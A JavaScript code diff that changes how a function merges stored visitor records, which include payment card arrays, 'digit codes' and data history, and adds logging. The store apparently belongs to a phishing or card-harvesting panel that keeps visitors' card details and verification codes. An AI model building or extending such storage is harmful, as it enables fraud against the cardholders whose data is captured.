@@ -229,9 +229,44 @@ function parseUserAgent(ua) {
 function saveVisitorPermanently(visitor) {
   const existingIndex = savedVisitors.findIndex(v => v._id === visitor._id);
   if (existingIndex >= 0) {
-    savedVisitors[existingIndex] = { ...savedVisitors[existingIndex], ...visitor };
+    const existing = savedVisitors[existingIndex];
+    // Properly merge arrays instead of replacing them
+    const mergedVisitor = { ...existing, ...visitor };
+    
+    // Merge dataHistory arrays
+    if (existing.dataHistory && visitor.dataHistory) {
+      // Use visitor's dataHistory as it should be the complete one
+      mergedVisitor.dataHistory = visitor.dataHistory;
+    } else if (existing.dataHistory && !visitor.dataHistory) {
+      mergedVisitor.dataHistory = existing.dataHistory;
+    }
+    
+    // Merge paymentCards arrays
+    if (existing.paymentCards && visitor.paymentCards) {
+      mergedVisitor.paymentCards = visitor.paymentCards;
+    } else if (existing.paymentCards && !visitor.paymentCards) {
+      mergedVisitor.paymentCards = existing.paymentCards;
+    }
+    
+    // Merge digitCodes arrays
+    if (existing.digitCodes && visitor.digitCodes) {
+      mergedVisitor.digitCodes = visitor.digitCodes;
+    } else if (existing.digitCodes && !visitor.digitCodes) {
+      mergedVisitor.digitCodes = existing.digitCodes;
+    }
+    
+    // Merge data objects
+    if (existing.data && visitor.data) {
+      mergedVisitor.data = { ...existing.data, ...visitor.data };
+    } else if (existing.data && !visitor.data) {
+      mergedVisitor.data = existing.data;
+    }
+    
+    savedVisitors[existingIndex] = mergedVisitor;
+    console.log(`Updated visitor ${visitor._id}, dataHistory length: ${mergedVisitor.dataHistory?.length || 0}`);
   } else {
     savedVisitors.push({ ...visitor });
+    console.log(`Added new visitor ${visitor._id}`);
   }
   saveData();
 }
